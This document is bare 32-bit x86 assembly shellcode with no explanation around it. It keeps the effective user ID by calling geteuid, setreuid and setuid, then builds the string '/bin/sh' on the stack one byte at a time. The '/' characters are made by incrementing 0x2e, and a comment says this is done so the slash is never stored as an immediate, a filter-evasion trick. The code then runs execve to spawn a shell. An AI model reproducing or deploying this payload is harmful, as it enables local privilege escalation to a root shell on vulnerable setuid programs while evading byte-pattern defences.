BITS 32
global _start
_start:
    ; euid = geteuid(); setreuid(euid,euid); setuid(euid)
    xor eax, eax
    mov al, 201
    int 0x80
    mov esi, eax
    mov ebx, eax
    mov ecx, eax
    xor eax, eax
    mov al, 70
    int 0x80
    xor eax, eax
    mov al, 23
    mov ebx, esi
    int 0x80
    ; build "/bin/sh" byte by byte: '/' = 0x2e + 1, never stored as an immediate
    sub esp, 8
    mov edi, esp
    xor eax, eax
    mov al, 0x2e
    inc eax
    mov [edi], al
    inc edi
    mov al, 0x62
    mov [edi], al
    inc edi
    mov al, 0x69
    mov [edi], al
    inc edi
    mov al, 0x6e
    mov [edi], al
    inc edi
    mov al, 0x2e
    inc eax
    mov [edi], al
    inc edi
    mov al, 0x73
    mov [edi], al
    inc edi
    mov al, 0x68
    mov [edi], al
    inc edi
    xor eax, eax
    mov [edi], al
    ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 11
    int 0x80
